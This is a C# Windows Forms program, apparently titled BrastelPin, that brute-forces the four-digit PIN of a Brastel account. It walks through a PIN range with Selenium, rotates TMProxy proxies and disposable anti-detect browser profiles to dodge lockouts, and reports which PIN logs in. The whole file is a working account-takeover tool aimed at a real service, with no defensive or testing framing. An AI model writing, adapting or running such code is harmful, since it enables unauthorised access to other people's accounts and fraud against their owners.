using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BrastelPin
{
    public partial class MainForm : Form
    {
        // Constants
        private const int PROXY_EXPIRATION_SECONDS = 150;
        private const int PROXY_RETRY_DELAY_MS = 30000;
        private const int MAX_CHECKS_PER_PROFILE = 10;
        private const int ELEMENT_WAIT_MS = 5000;
        private const int TYPING_DELAY_MS = 150;
        private const int BACKSPACE_DELAY_MS = 15;

        private GUIDataModel _gUIDataModel = null;
        private OmniLoginProfileManager _omniLoginProfileManager;
        private ProxyResponse _currentProxy;
        private DateTime _proxyStartTime;
        private CancellationTokenSource _cancellationTokenSource;

        private Queue<int> _pinQueue = new Queue<int>();
        private object _queueLock = new object();

        public MainForm()
        {
            InitializeComponent();
        }

        private async void btnStart_Click(object sender, EventArgs e)
        {
            rtbLog.Clear();

            AddLog("[INFO] Starting PIN checking process...");

            if (string.IsNullOrEmpty(_gUIDataModel.AccountCode))
            {
                AddLog("[ERROR] Account code is empty. Please check account code.");
                MessageBox.Show("Please check account code");
                return;
            }

            if (_gUIDataModel.PinFrom > _gUIDataModel.PinTo)
            {
                AddLog($"[ERROR] Invalid PIN range: {_gUIDataModel.PinFrom} to {_gUIDataModel.PinTo}");
                MessageBox.Show("Please check PIN range");
                return;
            }

            if (string.IsNullOrEmpty(_gUIDataModel.TMProxy))
            {
                AddLog("[ERROR] TMProxy is empty. Please check TMProxy.");
                MessageBox.Show("Please check TMProxy");
                return;
            }

            // Initialize PIN queue
            _pinQueue.Clear();
            int totalPins = 0;
            for (int i = _gUIDataModel.PinFrom; i <= _gUIDataModel.PinTo; i++)
            {
                _pinQueue.Enqueue(i);
                totalPins++;
            }

            AddLog($"[INFO] Starting PIN check for account code: {_gUIDataModel.AccountCode}");
            AddLog($"[INFO] PIN range: {_gUIDataModel.PinFrom} to {_gUIDataModel.PinTo} (Total: {totalPins} PINs)");
            AddLog($"[INFO] Using TMProxy API key: {_gUIDataModel.TMProxy.Substring(0, Math.Min(10, _gUIDataModel.TMProxy.Length))}...");

            // Create cancellation token for stopping
            _cancellationTokenSource = new CancellationTokenSource();

            ToogleControl(false);

            try
            {
                await Task.Run(() => WorkerThread(_cancellationTokenSource.Token), _cancellationTokenSource.Token);
                AddLog("[INFO] Completed checking all PINs.");
            }
            catch (OperationCanceledException)
            {
                AddLog("[INFO] PIN checking process was stopped by user.");
            }
            catch (Exception ex)
            {
                AddLog($"[ERROR] Unexpected error in main process: {ex.Message}");
            }
            finally
            {
                _cancellationTokenSource?.Dispose();
                _cancellationTokenSource = null;
                ToogleControl(true);
            }
        }

        private void ToogleControl(bool enable)
        {
            txtAccountCode.Enabled = enable;
            txtPinFrom.Enabled = enable;
            txtPinTo.Enabled = enable;
            txtTMProxy.Enabled = enable;
            txtOmniloginURL.Enabled = enable;
            btnDeleteAllProfiles.Enabled = enable;
            btnStart.Enabled = enable;
            btnStop.Enabled = !enable;

            // Reset stop button text when enabling controls
            if (enable)
            {
                btnStop.Text = "Stop";
            }

            AddLog($"[INFO] Controls {(enable ? "enabled" : "disabled")}");
        }

        private async void WorkerThread(CancellationToken cancellationToken)
        {
            bool firstGetProxy = true;
            int countCheck1Profile = 0;
            int totalProcessed = 0;

            AddLog("[INFO] Worker thread started");

            while (!cancellationToken.IsCancellationRequested)
            {
                countCheck1Profile = 0;

                // Check if we need to get a new proxy
                if ((firstGetProxy == true) || ((DateTime.Now - _proxyStartTime).TotalSeconds > PROXY_EXPIRATION_SECONDS))
                {
                    AddLog($"[INFO] {(firstGetProxy ? "Getting initial proxy" : "Proxy expired, getting new proxy")}");
                    firstGetProxy = false;

                    while (!cancellationToken.IsCancellationRequested)
                    {
                        _currentProxy = await GetProxyAsync();
                        if (_currentProxy != null)
                        {
                            AddLog($"[INFO] Proxy obtained successfully: {_currentProxy.data.https}");
                            _proxyStartTime = DateTime.Now;
                            break;
                        }
                        else
                        {
                            AddLog("[ERROR] Failed to get proxy. Retrying in 30 seconds...");
                            await Task.Delay(PROXY_RETRY_DELAY_MS, cancellationToken);
                        }
                    }
                }

                int pin;
                lock (_queueLock)
                {
                    if (_pinQueue.Count == 0)
                    {
                        AddLog("[INFO] PIN queue is empty, ending worker thread");
                        return;
                    }
                    pin = _pinQueue.Dequeue();
                    AddLog($"[INFO] Remaining PINs in queue: {_pinQueue.Count}");
                }

                // Check for cancellation before processing PIN
                if (cancellationToken.IsCancellationRequested)
                {
                    AddLog("[INFO] Cancellation requested, stopping worker thread");
                    return;
                }

                string pinStr = pin.ToString("D4");
                AddLog($"[INFO] Processing PIN: {pinStr}");

                try
                {
                    AddLog("[INFO] Creating new profile...");
                    string profileId = await _omniLoginProfileManager.CreateProfileAsync("");
                    if (string.IsNullOrEmpty(profileId))
                    {
                        AddLog("[ERROR] Failed to create profile");
                        break;
                    }
                    AddLog($"[INFO] Profile created successfully: {profileId}");

                    AddLog("[INFO] Starting profile...");
                    int port = await _omniLoginProfileManager.StartProfileAndGetPortAsync(profileId);
                    if (port == 0)
                    {
                        AddLog("[ERROR] Failed to start profile");
                        await CleanupProfile(profileId);
                        break;
                    }
                    AddLog($"[INFO] Profile running on port: {port}");

                    using (ChromeDriver driver = _omniLoginProfileManager.GetChromeDriverFromPort(port))
                    {
                        AddLog("[INFO] Chrome driver initialized, navigating to Brastel login page");
                        driver.Navigate().GoToUrl("https://www.brastel.com/eng/myaccount");
                        AddLog("[INFO] Successfully navigated to login page");

                        try
                        {
                            AddLog($"[INFO] Attempting login with PIN: {pinStr}");

                            // Enter account code
                            AddLog("[INFO] Locating account code input field");
                            var accCodeInput = driver.FindElement(By.Id("accCodeInput"));

                            // Clear existing text
                            for (int i = 0; i < 10; i++)
                            {
                                accCodeInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
                                Thread.Sleep(BACKSPACE_DELAY_MS);
                            }

                            // Enter account code
                            AddLog($"[INFO] Entering account code: {_gUIDataModel.AccountCode}");
                            foreach (char c in _gUIDataModel.AccountCode)
                            {
                                accCodeInput.SendKeys(c.ToString());
                                Thread.Sleep(TYPING_DELAY_MS);
                            }

                            // Enter PIN
                            AddLog("[INFO] Locating PIN input field");
                            var pinInput = driver.FindElement(By.Id("pinInput"));

                        CHECK_PIN:
                            // Clear existing text
                            for (int i = 0; i < 10; i++)
                            {
                                pinInput.SendKeys(OpenQA.Selenium.Keys.Backspace);
                                Thread.Sleep(BACKSPACE_DELAY_MS);
                            }

                            // Enter PIN twice (as required by the site)
                            AddLog($"[INFO] Entering PIN: {pinStr}");
                            for (int pinEntry = 0; pinEntry < 2; pinEntry++)
                            {
                                foreach (char c in pinStr)
                                {
                                    pinInput.SendKeys(c.ToString());
                                    Thread.Sleep(TYPING_DELAY_MS);
                                }
                            }

                            // Click sign in button
                            AddLog("[INFO] Clicking SIGN IN button");
                            var btnSignIn = driver.FindElement(By.XPath("//button[contains(text(), 'SIGN IN')]"));
                            ((IJavaScriptExecutor)driver).ExecuteScript("arguments[0].click();", btnSignIn);

                            AddLog("[INFO] Waiting for login response...");
                            Thread.Sleep(ELEMENT_WAIT_MS);

                            // Check for error message
                            var findErrorDisplay = driver.FindElement(By.XPath("//span[contains(normalize-space(), 'Invalid User ID or PIN.')]"));
                            if (findErrorDisplay.Displayed)
                            {
                                totalProcessed++;
                                Invoke(new Action(() =>
                                {
                                    AddLog($"[CHECKED] PIN {pinStr} is incorrect (Processed: {totalProcessed})");
                                }));
                            }
                            else
                            {
                                totalProcessed++;
                                Invoke(new Action(() =>
                                {
                                    AddLog($"[SUCCESS] Login successful with PIN: {pinStr} (Processed: {totalProcessed})");
                                }));

                                await CleanupProfile(profileId);
                                break;
                            }

                            countCheck1Profile++;
                            AddLog($"[INFO] Profile usage count: {countCheck1Profile}/{MAX_CHECKS_PER_PROFILE}");

                            if (countCheck1Profile < MAX_CHECKS_PER_PROFILE)
                            {
                                bool isEmptyQueue = false;
                                lock (_queueLock)
                                {
                                    if (_pinQueue.Count == 0)
                                    {
                                        isEmptyQueue = true;
                                    }
                                    else
                                    {
                                        pin = _pinQueue.Dequeue();
                                    }
                                }

                                if (isEmptyQueue)
                                {
                                    AddLog("[INFO] Queue is empty, cleaning up profile");
                                    await CleanupProfile(profileId);
                                    break;
                                }
                                else
                                {
                                    pinStr = pin.ToString("D4");
                                    AddLog($"[INFO] Reusing profile for next PIN: {pinStr}");
                                    goto CHECK_PIN;
                                }
                            }
                            else
                            {
                                AddLog("[INFO] Maximum profile usage reached, cleaning up");
                            }

                            await CleanupProfile(profileId);
                        }
                        catch (NoSuchElementException ex)
                        {
                            AddLog($"[ERROR] Element not found: {ex.Message}");
                            await CleanupProfile(profileId);
                            break;
                        }
                        catch (WebDriverException ex)
                        {
                            AddLog($"[ERROR] WebDriver error: {ex.Message}");
                            await CleanupProfile(profileId);
                            break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Invoke(new Action(() =>
                    {
                        AddLog($"[ERROR] Unexpected error: {ex.Message}");
                    }));
                }
            }
        }

        private async Task CleanupProfile(string profileId)
        {
            try
            {
                AddLog($"[INFO] Stopping profile: {profileId}");
                await _omniLoginProfileManager.StopProfileAsync(profileId);

                AddLog($"[INFO] Deleting profile: {profileId}");
                await _omniLoginProfileManager.DeleteProfileAsync(profileId);

                AddLog($"[INFO] Profile cleanup completed: {profileId}");
            }
            catch (Exception ex)
            {
                AddLog($"[ERROR] Failed to cleanup profile {profileId}: {ex.Message}");
            }
        }

        private async Task<ProxyResponse> GetProxyAsync()
        {
            string url = "https://tmproxy.com/api/proxy/get-new-proxy";
            string apiKey = _gUIDataModel.TMProxy;

            AddLog("[INFO] Requesting new proxy from TMProxy API");

            var json =
                $@"{{
                    ""api_key"": ""{apiKey}"",
                    ""id_location"": 0,
                    ""id_isp"": 0
                }}";

            using (HttpClient client = new HttpClient())
            {
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                try
                {
                    HttpResponseMessage response = await client.PostAsync(url, content);
                    string result = await response.Content.ReadAsStringAsync();

                    AddLog($"[INFO] TMProxy API response received (Status: {response.StatusCode})");

                    // Deserialize JSON response
                    var proxyResponse = JsonConvert.DeserializeObject<ProxyResponse>(result);

                    if (proxyResponse != null && proxyResponse.code == 0)
                    {
                        AddLog("[INFO] Proxy response parsed successfully");
                        return proxyResponse;
                    }
                    else
                    {
                        AddLog($"[ERROR] Invalid proxy response - Code: {proxyResponse?.code}");
                        return null;
                    }
                }
                catch (HttpRequestException ex)
                {
                    AddLog($"[ERROR] HTTP request failed: {ex.Message}");
                    return null;
                }
                catch (JsonException ex)
                {
                    AddLog($"[ERROR] Failed to parse proxy response JSON: {ex.Message}");
                    return null;
                }
                catch (Exception ex)
                {
                    AddLog($"[ERROR] Unexpected error getting proxy: {ex.Message}");
                    return null;
                }
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            AddLog("[INFO] Application starting up...");

            _gUIDataModel = GUIDataModel.LoadFromFile();
            AddLog("[INFO] Configuration loaded from file");

            _omniLoginProfileManager = new OmniLoginProfileManager(_gUIDataModel.OmniloginURL, AddLog);
            AddLog($"[INFO] OmniLogin manager initialized with URL: {_gUIDataModel.OmniloginURL}");

            // Load UI values
            txtAccountCode.Text = _gUIDataModel.AccountCode;
            txtPinFrom.Text = _gUIDataModel.PinFrom.ToString();
            txtPinTo.Text = _gUIDataModel.PinTo.ToString();
            txtTMProxy.Text = _gUIDataModel.TMProxy;
            txtOmniloginURL.Text = _gUIDataModel.OmniloginURL;

            // Setup event handlers
            txtAccountCode.TextChanged += new EventHandler(TextBoxTextChanged);
            txtPinFrom.TextChanged += new EventHandler(TextBoxTextChanged);
            txtTMProxy.TextChanged += new EventHandler(TextBoxTextChanged);
            txtPinTo.TextChanged += new EventHandler(TextBoxTextChanged);
            txtOmniloginURL.TextChanged += new EventHandler(TextBoxTextChanged);

            _proxyStartTime = DateTime.Now;

            AddLog("[INFO] Application initialized successfully");
        }

        private void rtbLog_TextChanged(object sender, EventArgs e)
        {
            rtbLog.SelectionStart = rtbLog.Text.Length;
            rtbLog.ScrollToCaret();
        }

        private void TextBoxTextChanged(object sender, EventArgs e)
        {
            try
            {
                _gUIDataModel.AccountCode = txtAccountCode.Text;
                _gUIDataModel.PinFrom = int.Parse(txtPinFrom.Text);
                _gUIDataModel.PinTo = int.Parse(txtPinTo.Text);
                _gUIDataModel.TMProxy = txtTMProxy.Text;
                _gUIDataModel.OmniloginURL = txtOmniloginURL.Text;
                _gUIDataModel.SaveToFile();

                AddLog("[INFO] Configuration updated and saved");
            }
            catch (Exception ex)
            {
                AddLog($"[ERROR] Failed to save configuration: {ex.Message}");
            }
        }

        private void TextBoxPinKeyPress(object sender, KeyPressEventArgs e)
        {
            if (char.IsControl(e.KeyChar))
            {
                return;
            }

            if (!char.IsDigit(e.KeyChar))
            {
                e.Handled = true;
                return;
            }

            TextBox tb = sender as TextBox;
            string newText = tb.Text.Insert(tb.SelectionStart, e.KeyChar.ToString());

            if (int.TryParse(newText, out int value))
            {
                if (value > 9999)
                {
                    e.Handled = true;
                }
            }
            else
            {
                e.Handled = true;
            }
        }

        private void AddLog(string log)
        {
            rtbLog.Invoke(new Action(() =>
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                rtbLog.AppendText($"[{timestamp}] {log}" + Environment.NewLine);
            }));
        }

        private async void btnDeleteAllProfiles_Click(object sender, EventArgs e)
        {
            rtbLog.Clear();
            AddLog("[INFO] Starting to delete all profiles...");

            bool enableControl = false;
            txtAccountCode.Enabled = enableControl;
            txtPinFrom.Enabled = enableControl;
            txtPinTo.Enabled = enableControl;
            txtTMProxy.Enabled = enableControl;
            txtOmniloginURL.Enabled = enableControl;
            btnDeleteAllProfiles.Enabled = enableControl;
            btnStart.Enabled = enableControl;
            btnStop.Enabled = enableControl;

            try
            {
                bool result = await _omniLoginProfileManager.DeleteAllProfilesAsync();
                if (result)
                {
                    AddLog("[INFO] Successfully deleted all profiles");
                }
                else
                {
                    AddLog("[ERROR] Failed to delete all profiles");
                }
            }
            catch (Exception ex)
            {
                AddLog($"[ERROR] Exception while deleting profiles: {ex.Message}");
            }

            enableControl = true;
            txtAccountCode.Enabled = enableControl;
            txtPinFrom.Enabled = enableControl;
            txtPinTo.Enabled = enableControl;
            txtTMProxy.Enabled = enableControl;
            txtOmniloginURL.Enabled = enableControl;
            btnDeleteAllProfiles.Enabled = enableControl;
            btnStart.Enabled = enableControl;
            btnStop.Enabled = enableControl;

            AddLog("[INFO] All controls re-enabled");
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            AddLog("[INFO] Stop button clicked - requesting cancellation...");

            if (_cancellationTokenSource != null && !_cancellationTokenSource.Token.IsCancellationRequested)
            {
                _cancellationTokenSource.Cancel();
                AddLog("[INFO] Cancellation request sent to worker thread");

                // Disable stop button to prevent multiple clicks
                btnStop.Enabled = false;
                btnStop.Text = "Stopping...";

                AddLog("[INFO] Please wait while the current operation completes...");
            }
            else
            {
                AddLog("[INFO] No active process to stop or already stopping");
            }
        }
    }
}
